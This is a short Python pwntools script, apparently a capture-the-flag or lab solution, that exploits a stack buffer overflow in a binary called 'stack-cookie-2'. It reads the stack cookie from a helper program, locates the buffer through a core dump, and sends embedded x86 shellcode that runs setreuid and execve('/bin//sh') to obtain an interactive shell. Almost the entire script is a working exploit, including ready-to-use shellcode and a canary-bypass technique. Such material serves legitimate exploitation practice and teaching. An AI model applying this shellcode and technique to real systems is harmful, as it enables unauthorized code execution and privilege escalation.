#!/usr/bin/env python

from pwn import *
import os

SHELLCODE='j2X\xcd\x80PP[YjGX\xcd\x801\xc91\xd2j\x0bX\x99Rhn/shh//biT[\xcd\x80'

p = process('./randFunc')
output = p.readline()
rand = int(output)
print(rand)



buf = SHELLCODE + "A"*(0x84 - len(SHELLCODE)) + p32(rand) + "AAAA"*2
p = process('./stack-cookie-2')
p.sendline(buf)
p.wait()
c=Core('./core')

buf_addr = c.stack.find(buf)

p=process('./stack-cookie-2')
string = SHELLCODE + "A"*(0x84 -len(SHELLCODE)) + p32(rand)+"AAAA" + p32(buf_addr)
p.sendline(string)
p.interactive()

